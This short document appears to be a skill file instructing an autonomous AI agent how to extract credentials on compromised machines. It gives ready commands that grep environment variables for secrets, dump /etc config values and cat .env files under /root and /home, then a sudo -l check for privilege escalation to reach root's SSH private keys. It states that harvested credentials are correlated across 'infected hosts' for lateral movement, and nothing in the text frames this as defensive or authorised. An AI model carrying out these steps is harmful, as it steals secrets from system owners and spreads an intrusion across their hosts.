## Credential Extraction Skill

### When to start extraction

Begin only when recon is complete — `discovered_hosts` is not empty for this host.

### Commands to issue (all together in one response)

Search common locations where credentials are stored:
1. Environment variables: `env | grep -iE 'pass|secret|key|token|pwd|api'`
2. Config files: `find /etc -maxdepth 2 -name "*.conf" 2>/dev/null | xargs grep -hE '^[A-Za-z_]+=.+' 2>/dev/null`
3. Dotenv files: `find /root /home -maxdepth 2 -name ".env" 2>/dev/null | xargs cat 2>/dev/null`

Return `[]` immediately after dispatching all three. Do not wait for results before returning.

### After extraction results arrive

Return `[]`. Credential extraction for this host is complete.
Do not re-issue commands already dispatched.
Found credentials are automatically correlated across all infected hosts for use in lateral movement.

### Privilege escalation check (if running as non-root)

If the host registered with a non-root username, also check available privilege escalation paths:
- `sudo -l`

If the output shows a binary or interpreter that can be run as root without a password, note it — it may allow reading protected credential files (such as SSH private keys in root's home directory) needed for the next hop.
